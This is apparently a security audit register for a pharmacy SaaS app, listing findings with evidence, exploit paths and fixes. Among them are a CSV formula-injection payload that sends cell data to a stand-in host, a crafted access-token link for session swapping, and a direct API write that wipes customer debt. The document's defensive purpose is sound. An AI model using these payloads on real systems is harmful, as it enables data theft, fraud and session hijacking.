# NevOut Meds: security findings register (final pre-pilot audit)

- **Audit date:** 2026-10-04
- **Baseline:** `main` @ `fe17a10`, which is production as deployed. Remediation is on the branch `security/final-pilot-audit`.
- **Companion documents:** [FINAL_SECURITY_AUDIT_REPORT.md](FINAL_SECURITY_AUDIT_REPORT.md) and [PILOT_SECURITY_GO_NO_GO.md](PILOT_SECURITY_GO_NO_GO.md)

## How to read this register

**Severity levels**

| Level | Meaning |
|---|---|
| P0 | Immediate compromise, data loss or cross-tenant exposure |
| P1 | Blocks the pilot |
| P2 | Important hardening |
| P3 | Defense in depth or improvement |
| INFO | Verified posture, or does not apply |

**Classes**

| Class | Meaning |
|---|---|
| **V** | Confirmed vulnerability |
| **D** | Defense-in-depth recommendation |
| **L** | Legal or compliance uncertainty |
| **G** | Deliberately deferred operational gate |
| **N/A** | Not applicable |

**Evidence labels**

| Label | Meaning |
|---|---|
| **probe** | Reproduced on a disposable local database built from the same 21 migrations that production runs. Production lists exactly `0001`–`0021`; verified read-only with `supabase migration list`. |
| **prod** | Observed non-destructively against production. |
| **code** | Established by reading the code. |

**Status values**

| Status | Meaning |
|---|---|
| FIXED (branch) | Code change plus regression test on the audit branch. Not deployed. |
| FIX READY, AWAITING AUTHORISATION | Migration or configuration written and validated locally. Not applied to production. |
| OPEN | No change made yet. |
| OWNER ACTION | Only the owner can resolve it. |
| ACCEPTED/DOCUMENTED | Known and documented; no change planned. |

No adversarial tenant was created in production. All tenant-isolation and authorization attacks ran on a disposable local database, which was dropped afterwards.

---

## P0 findings

**None.** The probes found no cross-tenant read or write of row data, no privilege escalation, and no anonymous data access. See the INFO section for what was verified.

---

## P1 findings

### SA-01: Staff can rewrite customer money fields directly through the REST API

| Field | Detail |
|---|---|
| Severity / class | **P1 / V**. Confirmed by probe. |
| Component | `public.customers` table privileges (PostgREST) |
| Evidence | `public.customers` keeps Supabase's default table-level INSERT and UPDATE on every column for `authenticated`. Probe output: `information_schema.column_privileges` shows authenticated INSERT/UPDATE on all 23 columns. The `customers_update` policy checks only the tenant. As `staffA` (the lowest role, aal1, no MFA needed), the probe ran `update customers set credit_balance = 0, total_spend = 123456` and it succeeded (`{"credit_balance":0,"total_spend":123456}`). Baseline run without the fix: tests 452, 453 and 455 in `supabase/tests/80_final_security_audit.test.sql` fail. |
| Exploit path | Any signed-in team member can call `PATCH /rest/v1/customers?id=eq.<id>` with their own session token, from browser devtools, and set `{"credit_balance":0}`. No UI is needed. |
| Actual impact | A customer's debt to the pharmacy can be silently written off by an insider. `credit_balance` has no ledger, and repayments do not exist in the product yet (`CustomersScreen.jsx:297`), so **no audit trail exists**. The dashboard's outstanding-credit figure and the credit report become untrustworthy. Spend and visit statistics can also be forged. The damage stays within one tenant; there is no cross-tenant effect. |
| Reproducible | Yes. `supabase/tests/80_final_security_audit.test.sql`, block SA-01. |
| Remediation | Migration `supabase/migrations/0022_final_security_audit.sql` §SA-01 revokes table-level INSERT/UPDATE on `customers` and re-grants every column **except** `credit_balance`, `total_spend`, `visit_count` and `last_visit`. Those four remain maintained only by the hardened `SECURITY DEFINER` sale RPCs. No app screen or import writes them; verified by grep and by the import builders' test. `pharmacy_id` stays updatable because PostgREST upserts SET every payload column; RLS `with check` still pins it to the caller's pharmacy (test added). |
| Tests | 10 SQL assertions in `80_final_security_audit.test.sql`: direct writes refused; ordinary fields, registration and the exact PostgREST import upsert still work; a credit sale through the RPC still raises the balance by exactly the sale amount. |
| Blocks pilot | **Yes, before real credit-sale data.** It must be applied to production first, and that needs owner authorisation (migration). |
| Status | **FIX READY, AWAITING AUTHORISATION.** Validated on a fresh database: 481/481 SQL checks pass. Also applied to the *local* dev database for the UI suites. |

---

## P2 findings

### SA-02: Idempotent RPCs return a stored result before authorising the caller

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed by probe. |
| Component | `private.claim_idempotency` (`0017_offline_idempotency_realtime.sql:44-64`), used by `record_purchase_idempotent`, `adjust_stock_idempotent`, `create_product_idempotent` and `create_purchase_order_idempotent` |
| Evidence | On a replay, the wrapper returns the stored result before any tenant, status or MFA check runs. The probe returned pharmacy A's purchase id and stock level to all of these callers: tenant B's owner, a user with no profile, a suspended staff member, and an aal1 owner. A key could also be replayed as a different action: a sale key sent to `create_product_idempotent` returned NULL as if it had succeeded. |
| Exploit path | Requires pharmacy A's UUID **and** one of its idempotency keys. Keys are random v4 UUIDs (`client/src/platform/offline/queue.ts:57`) that never leave the device. |
| Actual impact | Leaks an id or a stock count only. Nothing is written: a fresh key rolls back. Impractical without a leaked key. |
| Remediation | `0022` §SA-02: `claim_idempotency` now requires `private.pharmacy_id() = p_pharmacy_id` (active, MFA-satisfied member) before claiming or returning, and refuses a key reused for a different mutation type. |
| Tests | 7 assertions: cross-tenant, no-profile, aal1, suspended and type-confusion replays are refused; the legitimate device replay still succeeds with no duplicate purchase. |
| Blocks pilot | No |
| Status | FIX READY, AWAITING AUTHORISATION (in `0022`) |

### SA-03: Pending invitations outlive the authority of the person who issued them

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed by probe. |
| Component | `suspend_staff`, `remove_staff`, `set_staff_role`, `accept_staff_invitation` (0014/0020) |
| Evidence | Owner A issued an **owner-role** invitation and was then suspended. The invitee still accepted it and became owner (`09_invite_after_suspend.sql`). `invite_staff` permits `p_role='owner'`. |
| Exploit path | Someone with brief access to an owner's aal2 session mints an owner invitation to their own address. That access survives the owner being suspended or offboarded. |
| Remediation | `0022` §SA-03 adds a trigger on `users_profiles` (status/role change). When the person no longer holds `staff.invite`, or is not active, every pending invitation they issued is revoked. A one-time cleanup handles existing orphans. |
| Tests | 4 assertions (suspension, demotion, unrelated change keeps the invitation) |
| Blocks pilot | No |
| Status | FIX READY, AWAITING AUTHORISATION. Also consider requiring `staff.role.manage` plus re-authentication for owner-role invitations (P3, OPEN). |

### NV-OFF-01: Sign-out left the previous pharmacy's cached data readable on the device

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed in code. |
| Component | Offline cache (IndexedDB `nevoutmeds` → `cache`, `meta`) |
| Evidence | On `main`, `signOut()` (`client/src/platform/auth/AuthProvider.tsx:344-354`) only calls `supabase.auth.signOut()`. `clearTenantCache` (`client/src/platform/offline/db.ts:97`) is defined but **never called**. The cache holds `select *` snapshots of customers (name, phone, DOB, conditions, allergies, notes, credit), reminders (medicine names), suppliers, inventory and purchase orders, plus a profile snapshot. |
| Exploit path | On a shared counter device, after the owner or staff member signs out, anyone with the browser can read the previous pharmacy's customers and health fields through devtools → Application → IndexedDB. The UI correctly shows nothing, because data is partitioned by `pharmacy_id:user_id`. |
| Actual impact | Local disclosure of customer health-inferable data on shared devices. It is not remotely exploitable. |
| Remediation | `forgetSignedOutDeviceData()` (`client/src/platform/offline/session.ts`) clears the `cache` and `meta` stores whenever there is no session: an explicit sign-out, a suspension or removal sign-out, a revoked session, or a start-up with nobody signed in. **The queue is deliberately kept.** It is the only copy of unsynced sales, it stays partitioned, and the server re-authorises it on replay. Cached reads only ever serve a signed-in session, and a new sign-in needs the network, so offline-first behaviour is unchanged. |
| Tests | `supabase/tests/ui_offline_first.e2e.mjs` adds two checks: after sign-out, `cache` and `meta` are empty; and pharmacy B's device cache holds nothing from pharmacy A. This replaces a check that always passed. |
| Blocks pilot | No (P2). Recommended before shared devices are used. |
| Status | FIXED (branch) for online sign-out. The supplemental audit showed the offline sign-out path was not covered; that is completed by **NV-OFF-02**. |

### NV-EXP-01: CSV exports were open to spreadsheet formula injection

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed. |
| Component | `downloadCsv` (`client/src/platform/features/reports/charts.jsx:55-58` on `main`) and `buildDocumentsIndexCsv` (`client/src/platform/features/documents/exports.ts:29`) |
| Evidence | Values starting with `= + - @ \t \r` were written verbatim. The documents index wrapped values in quotes without escaping inner quotes, so a value could break out of its cell, and missing values exported as the text `undefined`. Staff can set product, customer and supplier names, which owners then export. |
| Exploit path | A staff member names a customer `=HYPERLINK("http://x/?"&B2,"click")`. The owner exports the customer-credit report and opens it in Excel or Sheets. |
| Actual impact | Data exfiltration through hyperlinks, or DDE on legacy Excel, aimed at the owner |
| Remediation | A single encoder, `client/src/platform/utils/csv.ts`, now quotes every cell, doubles inner quotes, prefixes formula-like text with `'` (plain numbers excepted) and exports empty for null. Both export paths use it. |
| Tests | `supabase/tests/export_import_safety.test.mjs`: 11 CSV assertions. Baseline on `main`: they fail. |
| Blocks pilot | No |
| Status | FIXED (branch) |

### NV-IMP-01: An "Update existing" import reset fields the file did not contain

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed. Data integrity. |
| Component | `client/src/platform/import/rows.ts` (`buildProducts`, `buildCustomers`) with PostgREST upsert (`ImportPage.tsx:151`) |
| Evidence | A minimal file (required columns only) sent `reorder_point/max_stock/daily_velocity: 0`, `brand/unit: null` and `credit_limit: 0`. The upsert then overwrote existing values. The baseline test on `main` lists those keys. |
| Actual impact | One re-import silently disables reorder alerts and sets every customer's credit limit to 0, which the dashboard reads as "no limit". |
| Remediation | Optional columns are sent only when the column exists in the file. All rows share the file's headers, so the PostgREST bulk-key requirement still holds. |
| Tests | 5 assertions in `export_import_safety.test.mjs`, including one that checks the import never sends `credit_balance` or `total_spend` |
| Blocks pilot | No |
| Status | FIXED (branch) |

### NV-IMP-02: Product names are unique only by exact case

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed by reading. |
| Evidence | The constraint is `unique (pharmacy_id, name)` and is case-sensitive (`0007:12`). The client de-duplicates in lower case (`rows.ts:95`). `import_inventory_levels` matches `lower(name)` with a non-STRICT `select into` (`0020:803-806`). |
| Impact | Importing "paracetamol" when "Paracetamol" exists creates a duplicate product. Later stock imports then write to an arbitrary one of the two. |
| Remediation | Add a unique index on `(pharmacy_id, lower(name))` after a duplicate check on production data, and use STRICT matching in the RPC. This needs a migration and a data review, so it is not included in `0022`. |
| Blocks pilot | No. Mitigation: owners import once into an empty pharmacy, per the import guide. |
| Status | OPEN, proposed |

### NV-HDR-01: No anti-framing header, CSP or nosniff in production

| Field | Detail |
|---|---|
| Severity / class | P2 / D. Confirmed in prod. |
| Evidence | `curl -D -` against `https://nevoutmeds.com/` and `/platform` returns only `strict-transport-security`. There is no `X-Frame-Options` or `frame-ancestors`, no `Content-Security-Policy`, no `X-Content-Type-Options` and no `Referrer-Policy`. `vercel.json` on `main` has rewrites only. |
| Exploit path | Clickjacking of owner actions such as suspend, reset two-step or invite: a hostile page frames the app. Without a CSP, any future XSS has no second line of defence. |
| Remediation | `vercel.json` now sends these headers: `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, a restrictive `Permissions-Policy`, and a CSP. The CSP allows `script-src 'self'`; `connect-src` only to self, the Supabase project (https/wss) and Sentry ingest; and `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`. |
| Tests | A local build served with these exact headers (Supabase host swapped to the local stack), with a report-only twin logging every violation, and the real-Chrome UI suites run against it. See the report §D for results. |
| Blocks pilot | No |
| Status | FIXED (branch). **Takes effect only on a production deploy, which needs owner authorisation.** |

### NV-AUTH-01: Public owner self-signup is enabled in production, contrary to the operator-provisioning model

| Field | Detail |
|---|---|
| Severity / class | P2 / D. Confirmed in prod. |
| Evidence | `GET /auth/v1/settings` returns `disable_signup:false` and `mailer_autoconfirm:false`. The login page offers "New pharmacy? Create an account" (`LoginPage.tsx`). `onboard_pharmacy` (`0018:801`) makes any confirmed user without a profile the owner of a new tenant (probe F11). |
| Current mitigation | Email confirmation stays on, and SMTP is deferred. Earlier reports observed the signup email hitting `over_email_send_rate_limit`, so in practice a stranger cannot confirm. This mitigation is **incidental**: configuring SMTP opens self-serve tenant creation. |
| Impact | Anyone can create isolated tenants (no cross-tenant reach). This also produces spam `auth.users` rows and pollutes the admin pilot metrics. |
| Remediation | Owner decision (`PILOT_GO_LIVE_CHECKLIST.md` item 7). Recommended: turn **Allow new users to sign up** off for the pilot. The operator path (`provision-owner.mjs`, admin API) and invited staff provisioned with `--for staff` keep working. Hide the signup link in the same release. |
| Blocks pilot | No |
| Status | OWNER ACTION (auth configuration; requires authorisation) |

### NV-DOC-01: A document with no stored file "downloaded" as placeholder text under the real file name

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Confirmed. Misleading user-facing behaviour. |
| Evidence | Saving a document needs only a name (`DocumentsScreen.jsx:264`), and the toast said "uploaded successfully". The download then saved a text file named, for example, `Licence.pdf`, containing the development note "[In production, the actual file would download from secure cloud storage]" (`exports.ts:15`). |
| Impact | A pharmacy may believe it holds a copy of a licence or certificate that does not exist. |
| Remediation | The export is now named `<name> - details.txt`, states that no file is stored and that it is not a copy, and the toast says so. Saving without a file reports "details only, no file attached". |
| Tests | 2 assertions in `export_import_safety.test.mjs` |
| Status | FIXED (branch) |

### NV-COPY-01: "Recorded sales rate" implied a measured figure; the rate is typed in by hand

| Field | Detail |
|---|---|
| Severity / class | P2 / V. Product claim. |
| Evidence | `daily_velocity` is only ever entered manually ("Sold per day (average)", or an import column). No function recalculates it from sales. Copy in Analyst, Expiry and Inventory nonetheless said "at its recorded sales rate". |
| Impact | Expiry and stock-out advice ("should sell before it expires") can be trusted as data-derived when it is an estimate. |
| Remediation | Wording changed to "entered sales rate" in 12 places. A better long-term fix is to compute the rate from the last 30 days of `purchase_items`, which is a product decision. |
| Status | FIXED (branch, copy only) |

### NV-PRIV-01: No privacy notice, terms or data-processing disclosure anywhere

| Field | Detail |
|---|---|
| Severity / class | P2 / L |
| Evidence | There is no `/privacy` or `/terms` route (`App.tsx`) and no such links on the home page, sign-in or signup. |
| Status | OWNER ACTION / legal review. See the report §legal. **No legal text was invented.** |

### NV-PRIV-02: Health-inferable customer data is collected without notice, consent capture or a deletion path

| Field | Detail |
|---|---|
| Severity / class | P2 / L |
| Evidence | `customers` holds name, phones, DOB, gender, `conditions[]`, `allergies[]` and free-text notes (`0003:5-15`). These are linked to medicine-level purchases and refill reminders. All staff hold `customers.read/create/update`. The UI has no delete or edit path for customers. The platform admin can read every tenant, including health fields (probe F12). |
| Status | OWNER ACTION / legal review. This is an existing backlog item (X8); go-live checklist item 6. |

### NV-OFF-02: Signing out while offline left the previous user's session and cached pharmacy data on the device

*Added 2026-10-04 from the supplemental Cloudflare security-audit run (run-1). Independently reproduced by a hunter and a separate verifier.*

| Field | Detail |
|---|---|
| Severity / class | **P2 / V.** Confirmed by local reproduction with the installed auth-js 2.104. |
| Component | `client/src/platform/auth/AuthProvider.tsx` `signOut()`; supabase-js sign-out |
| Evidence | auth-js `_signOut` POSTs `/auth/v1/logout` first. On a network failure it returns `AuthRetryableFetchError` **before** removing the stored session (`node_modules/@supabase/auth-js/dist/main/GoTrueClient.js` `_signOut`); scope `local` behaves the same. `AuthProvider.signOut` rethrew the error, and every caller dropped it (`AppShell` → `NevoutmedsApp` `onLogout`, `SecurityScreen.jsx:166`, `MfaGate.tsx:30`). No `SIGNED_OUT` fired, so NV-OFF-01's cleanup never ran. |
| Exploit path | A pharmacist presses Sign out (or "Sign out anyway" with unsynced work) during an outage. The workspace stays open, and survives a reload, with that user's session (aal2 for an owner), refresh token and cached customers. The next person at the device continues as them, offline and then online. |
| Actual impact | Shared-device takeover of the departed user's role, and disclosure of cached customer health-inferable data. Physical access is required; it is not remote. |
| Remediation | If the server sign-out fails, `signOut()` now removes the stored session from this device (`clearLocalAuthSession()` in `client/src/platform/supabaseClient.ts`; same keys as supabase-js's own sign-out). It then runs a local-scope sign-out, which finds nothing to revoke, makes no request, and emits `SIGNED_OUT` to all tabs, and clears the cached pharmacy data (`forgetSignedOutDeviceData`). It does **not** claim server revocation: the sign-in page says "Signed out on this device only" and how to have the account suspended if needed (`LoginPage.tsx`). Unsynced queued work is kept, tenant-bound; the sync engine now sends an entry only while the session of the user who queued it is active (`client/src/platform/offline/sync.ts`), so it is never replayed under the next user. |
| Tests | `supabase/tests/auth_session_security.test.mjs`: library-level, offline fallback, reload, reconnect and online path. `supabase/tests/ui_session_security.e2e.mjs` S-A…S-E in real Chrome with the production CSP: offline sign-out, offline reload, second user on the same device, queued work isolated then replayed for its own user, and online sign-out revoking the refresh token. Baseline on untouched `main`: unit 19/30 fail; e2e S-A, S-B, S-C and S-D fail. |
| Residual | A session ended offline is not revoked on the server; its refresh token is deleted from the device and the access token expires within 1 h. Queued payloads remain readable through devtools by someone at the device (not in the app). |
| Blocks pilot | No (P2). Fix before shared counter devices are used. |
| Status | **FIXED (branch)** |

### NV-AUTH-02: A link carrying `#access_token` could replace the signed-in user's session (session swap / login CSRF)

*Added 2026-10-04 from the supplemental Cloudflare security-audit run (run-1). Independently reproduced by a hunter and a separate verifier.*

| Field | Detail |
|---|---|
| Severity / class | **P2 / V.** Confirmed by local reproduction with the installed auth-js 2.104. |
| Component | `client/src/platform/supabaseClient.ts` (`detectSessionInUrl: true`, implicit flow) |
| Evidence | auth-js treats **any** URL with `access_token` as a login callback on any route and saves it over the stored session (`GoTrueClient._initialize`, `_isImplicitGrantCallback`). `AuthProvider` resolves the new user without comparing it to the previous one, and an attacker's aal2 token satisfies the MFA gate. |
| Exploit path | An attacker with their own pharmacy account (another pilot owner, or anyone holding a demo-owner login) sends a real-domain link such as `/platform#access_token=<attacker>`. The signed-in victim is silently switched into the attacker's workspace, and customers and sales they then enter land in the attacker's pharmacy. |
| Actual impact | New customer health data, sales and stock entered by the victim go to a tenant the attacker reads. The attacker gains no access to the victim's existing data. |
| Remediation | URL sessions are accepted **only** on the three routes Supabase email links actually use in this repository: `/reset-password` (in-app recovery and `ops/provision` setup links), `/accept-invite` (staff-admin invitation email and invitation sign-up confirmation) and `/onboarding` (owner sign-up confirmation). They are **never** accepted while a session is stored on the device (`client/src/platform/auth/urlSession.ts`, a function `detectSessionInUrl`). Refused tokens are stripped from the address bar and history synchronously before the router reads them, and again on `hashchange` (`client/src/main.tsx`). On an email-link route, a refused link shows "Someone is already signed in": the person must sign out and reopen the link, and there is deliberately no one-click continue (`UrlSessionRefused.tsx`; wired into `AcceptInvitePage`, `PasswordResetPages`, `OnboardingPage`, and auto-accept is suppressed). The storage key is set explicitly to supabase-js's own default, so existing sessions survive the deploy. Redirect allow-lists are unchanged. |
| Tests | `auth_session_security.test.mjs`: `/platform`, `/`, `/admin`, `/import`, `/login` (no swap, token never validated or stored, URL stripped); email-link routes while signed in (refused); signed-out recovery, invitation and confirmation links (still work); ordinary routes signed out (refused); pre-router screen. `ui_session_security.e2e.mjs` U-A…U-F with real GoTrue links: no swap on ordinary routes; refusal notice on email-link routes; data entered after a crafted link stays in the victim's pharmacy; signed-out recovery/setup and invitation links work end to end. Baseline on untouched `main`: unit 19/30 fail; e2e U-B, U-C and U-F fail. On `main`, U-F put the victim's new customer in the attacker's pharmacy. |
| Blocks pilot | No (P2). Fix before real data, together with the frontend deploy. |
| Status | **FIXED (branch)** |

### NV-OPS-02: Backup and restore scripts put the database owner password on process command lines (pre-pilot operational)

*Added 2026-10-04 from the supplemental Cloudflare security-audit run (run-1). Skill verdict: needs_validation, which depends on the backup host.*

| Field | Detail |
|---|---|
| Severity / class | **P2 / G, operational.** Tied to the backup/restore hard gate (go-live checklist #1). |
| Component | `ops/backup/lib.sh` `nv_pg`; `backup-db.sh`; `restore-db.sh` |
| Evidence | The full Postgres URL, including the password, is passed as a positional argument to `pg_dump`/`psql` (`lib.sh:80`) or to `docker run` (`lib.sh:83-84`). It is passed up to six times per backup, and on restore whether the target comes from `--target-url` or `NEVOUT_RESTORE_DB_URL`. This contradicts `ops/README.md:5`. It was reproduced with stub binaries through the real scripts (run-1 `ver-dbargv` check1). |
| Exploit path | Another non-root account or service on a Linux backup host without `/proc` `hidepid` reads `/proc/<pid>/cmdline` or `ps` during a run. The URL is also left in shell history when `--target-url` is used. |
| Actual impact | Database owner credential: every tenant's data plus `auth.users`, bypassing RLS. |
| Remediation | During the backup phase, pass the password through `PGPASSFILE` (chmod 600) or `PGPASSWORD` in the environment with a password-less URI, and use `docker run -e PGPASSWORD` / `--env-file` without inline values. Fix `docs/BACKUP_AND_RECOVERY.md:138`. Choose a single-purpose backup host; rotate the DB password if a pg-engine run ever happened on a shared host. Not redesigned now, by decision. |
| Blocks pilot | **Yes, as part of the backup gate:** resolve before the scheduled backup goes live, which already precedes real data. |
| Status | OPEN (backup phase) |

---

## P3 findings

| ID | Finding | Evidence | Class | Status |
|---|---|---|---|---|
| SA-04 | `authenticated` holds TRUNCATE/TRIGGER/REFERENCES on tables created after 0011 (`staff_audit_log`, `staff_invitations`, `mutation_receipts` …). The probe truncated the audit log in SQL. It is not reachable through PostgREST or GraphQL. | probe `05_truncate.sql`; tests 478-480 fail on baseline | V (SQL-only) | FIX READY in `0022` |
| SA-05 | `grant execute on all functions in schema private to authenticated` also exposes write helpers (`store_idempotent_result`, `audit_staff`). Reachable only from SQL, because `private` is not an exposed schema (`config.toml`). | probe | D | OPEN (narrow the grants in a later migration) |
| SA-06 | Last-owner race: two owners can demote each other at the same time, leaving no active owner. | probe `08a/08b` | V | OPEN (lock the pharmacy row) |
| SA-07 | `update_product_checked` lost update: two writers with the same expected version both succeed. | probe `10a/10b` | V | OPEN (`… and version = p_expected` in UPDATE) |
| SA-08 | Within-tenant integrity: `record_purchase` trusts the client `unit_price`; `purchase_orders.total/status` are client-writable; `purchase_order_items` delete has no capability check; mutating RPCs check the tenant but not `sales.create`/`inventory.*`, which is equivalent today. | probe | D | OPEN |
| SA-09 | Two admin `SECURITY DEFINER` functions use `search_path=public` (`0009:8`, `0010:8`). Both are admin-gated and fully qualified. | code | D | OPEN |
| SA-10 | Realtime DELETE events are not RLS-filtered by Supabase, so subscribers may receive other tenants' deleted primary keys (UUIDs only). | code / Supabase docs | D | ACCEPTED |
| NV-MFA-01 | After an MFA reset, the target's **current** access token stays `aal2` until it expires (≤ 1 h). The next refresh is `aal1`; verified on local GoTrue v2.197.0, the same version as production. For a stolen device, also revoke sessions (suspend, then reactivate). | local probe `scratchpad/mfaprobe` | D | DOCUMENTED; add to MFA_OPERATIONS |
| NV-CORS-01 | The production staff-admin allow-list includes `http://localhost:5173` and the legacy `*.vercel.app` origin. Exploitation would need the victim's token, so the risk is low. | prod | D | OWNER ACTION at activation (secret `NEVOUT_ALLOWED_APP_ORIGINS`) |
| NV-DEMO-01 | The demo owner's login is `demo@nevoutmeds.com`, which is also published as the public demo-request address (`HomePage.tsx:11`). It is protected by password plus mandatory TOTP and Supabase rate limits. A non-public login alias would remove the known-identifier half of credential stuffing. Admin metrics have no demo exclusion (`0010`, `0019`), so the demo tenant likely counts in pilot metrics. | prod log / code | D | OWNER ACTION (do not change the demo account during the audit) |
| NV-OPS-01 | The operator audit logs (`provision.log`, `security-ops.log`) did not record the target project. Local e2e runs (`*@e2e.local`) and production operations were interleaved indistinguishably. | `ops/provision/provision.log` | D | FIXED (branch): a `target` host field is added |
| NV-TEL-01 | `sync_conflict_dismissed` telemetry carried the queue summary, including customer name and sale amount. That telemetry is readable by the cross-tenant admin console. | `SyncProvider.tsx:118` | D | FIXED (branch) |
| NV-IMP-03 | XLSX files are identified by extension only. HTML, SYLK and CSV renamed `.xlsx` reach SheetJS's legacy parsers. | importprobe | D | OPEN |
| NV-IMP-04 | Parser resource use: an 8.5 KB file declaring a huge range took 35.8 s, and zip inflation used about 900 MB. Mitigated by the Worker and its 15 s terminate; memory can still kill low-end Android renderers. | importprobe | D | OPEN |
| NV-IMP-05 | Rows beyond 5000 are dropped without a warning. There are no DB length/precision CHECKs on product, customer or document text and numbers. | code | D | OPEN |
| NV-DOC-02 | The document storage key contains the raw file name, so non-ASCII and `#` names fail to upload. There is no client type/size pre-check, and the UI icon list does not match the bucket allow-list. | code | D | OPEN |
| NV-DOC-03 | A cross-origin `a.download` is ignored, so the tab navigates to the 60 s signed URL, which then sits in history until it expires. Deleting a document row orphans the storage object. | code | D | OPEN |
| NV-COPY-02 | Minor claims: the meta description "prevent stockouts … intelligent purchasing tools" (`index.html:9`); pricing tiers list "Integrations + APIs" and "smart inventory", which don't exist; "About 160 kB to start" (measured ≈190 kB); purchase-order CSV shows `sent` for orders only recorded; the reminder WhatsApp text names the medicine (privacy on shared phones); the price-compare hint doesn't match the ranking; the onboarding starter list says "names only" but sets Rx flags; realistic seed customers with health details ship in the bundle (shown only in demo builds); the sparkle icon on Analyst. | claims review | D | OPEN (copy; owner review) |
| NV-DEP-01 | `react-router-dom` 6.30.6 has two moderate advisories (backslash open redirect; SSR-only constructor injection). `vite`/`esbuild` advisories are dev-server-only. | `npm audit` | D | ACCEPTED/DOCUMENTED (`docs/DEPENDENCY_SECURITY.md`; post-pilot upgrade) |

---

## Leads requiring validation (not confirmed vulnerabilities)

These come from the supplemental Cloudflare security-audit run (run-1, `quick` profile). Its final coverage critic accepted them as missing coverage, but the profile allows no second hunting wave, so they are recorded `deferred`. Each needs validation before it can be classified.

| ID | Lead | Where to look | Validation | Status |
|---|---|---|---|---|
| NV-LEAD-01 | Restore lifecycle. Backups dump only `auth.users` and `auth.identities`, not MFA factors, so after a restore owners and admins have a password but no second factor. A password holder might enrol a new factor at aal1. Restoring an older artifact also brings back the snapshot-time member status, bans and invitation revocations (including those made by 0022 SA-03), and nothing reapplies later revocations. | `ops/backup/backup-db.sh:8,42,54-57`; `restore-db.sh:95-97`; `ops/backup/sql/functional-check.sql`; `docs/BACKUP_AND_RECOVERY.md` | Part of the backup gate's restore test: restore into a disposable project, then check factors, ban state and pending invitations against a post-snapshot change log. Check whether GoTrue allows first-factor enrolment at aal1 for an MFA-required role. | REQUIRES VALIDATION (backup phase) |
| NV-LEAD-02 | An owner's PostgREST DELETE on `customers`, `products` or `purchase_orders` cascades through composite FKs into ledger tables whose direct writes are revoked (`purchases`, `purchase_items`, `inventory`, `stock_movements`, `reminders`), and leaves no stock-movement or audit row. The client never issues these deletes; they are reachable only through the API. | `0011:108-117,175-178`; `0016:11-21`; `0020:851-866` | On a disposable database, as an aal2 owner, delete a customer with sales and a product with movements, and record what disappears and what audit remains. Then decide whether to restrict ledger cascades or log them. | REQUIRES VALIDATION |

The run's 36 P3 hardening notes are listed in the run's `COMPARISON.md` (outside the repository). None was added here as a finding.

## INFO: verified posture

| Area | Verified | Evidence |
|---|---|---|
| Production schema | Production has migrations `0001`–`0021`, identical to the repo | `supabase migration list --linked` |
| Edge Function | `staff-admin` v7 deployed. The downloaded deployed source is the type-stripped repo source, semantically identical. | `supabase functions download` + diff |
| CORS (prod) | These origins get `200` with the origin echoed: `https://nevoutmeds.com`, `https://nevout-meds-liberia-pilot.vercel.app`, `http://localhost:5173`. These get **403** from the function: `127.0.0.1:5173`, `evil.example`, `nevoutmeds.com.evil.example`, `null`, `www.nevoutmeds.com`. A POST with no auth header gets the **platform gateway** 401 with `access-control-allow-origin: *` (platform-generated, `sb-error-code: UNAUTHORIZED_NO_AUTH_HEADER`), not the function. JWT verification stays on. | curl |
| Edge/TLS | HSTS is present. `http://` and `www.` both 308-redirect to `https://nevoutmeds.com`. `/.env` returns the SPA shell, not a file. | curl |
| Bundle secrets | The production bundle (44 chunks) contains only the **anon** JWT for the project. There is no service-role key and no `sb_secret_`. No third-party scripts, fonts or analytics; Sentry is lazy and only loads with a DSN, which is not set. | prod chunk scan |
| Git history | The public repository has no real credentials. Gitleaks found 1 hit: a deliberate fake JWT fixture in `sentry_privacy.test.mjs` (role `authenticated`, no project ref). | gitleaks over 57 commits |
| RLS | Enabled on all 22 public tables. No `true`, user-metadata or client-writable predicates. anon has no table grants and every public function denies anon. Child FKs are composite `(pharmacy_id, x)`. | probe catalog |
| Escalation | Staff cannot obtain owner capabilities; owners cannot grant or invite `admin`; profile `role/pharmacy_id/status` cannot be self-edited (column grant plus trigger); `private.role_capabilities` is unreadable. | probe and suites 10/30/70 |
| MFA | aal1 owners and admins reach nothing beyond their own profile and posture, across PostgREST, RPC and the Edge Function. The gate reads only the signed `aal` claim. Reset deletes factors through the admin API, and the next refresh is aal1 (local GoTrue v2.197.0). No factor secret is ever read. | suite 70, api_mfa, local probe |
| Invitations | The token is stored as SHA-256. Wrong-email, replayed, expired, revoked and already-a-member cases are all refused. Invitations expire in 7 days by default (maximum 30). | suite 30 |
| Offline queue | Partitioned by `pharmacy_id:user_id` and replayed only once MFA is satisfied (`SyncProvider.tsx`). The server re-authorises every replay; a suspended account's work is rejected (suite 40). Same-key concurrency applies once (probe 06). Concurrent oversell is blocked by `inventory_stock_non_negative` (probe 07). Crash-during-sync resends safely through the idempotency key. | probe and suites |
| Service worker | Runtime caching matches on `request.destination` only: navigation, script/style/worker, images. Supabase API fetches are never cached. The TOTP QR is a `data:` URI and signed URLs live for 60 s. | `vite.config.ts` |
| Country model | Currency is locked once sales exist. Reports filter by currency; admin functions sum counts, never amounts across currencies. Tanzania is marked "Rules not yet verified" and computes no tax. | probe and claims review |
| Analyst | Deterministic arithmetic over the pharmacy's own records. No LLM or AI provider anywhere, so AI/LLM controls are **N/A**. | claims review |
| WhatsApp | Never marked as delivered. "Reminded" requires an explicit click, and the UI states that it cannot tell whether a message was delivered. | claims review |
| Documents bucket | Private, 25 MB limit, MIME allow-list (no SVG or HTML). Owner-only read/manage on both table and objects. The path prefix is server-enforced. | `0013`, `0020:887-921` |
| DOM sinks | No `dangerouslySetInnerHTML`, `eval`, `innerHTML` or `window.open`. Dynamic hrefs use fixed schemes. `safeInternalPath` blocks `//` and `/\`. | import review |

## Deliberately deferred gates (class G; not regressions)

| Gate | Status | Mandatory before |
|---|---|---|
| Independent encrypted backup **and a restore test** against production | KNOWN PRE-PILOT HARD GATE (`PILOT_GO_LIVE_CHECKLIST.md` #1) | Any real pharmacy, customer or patient data |
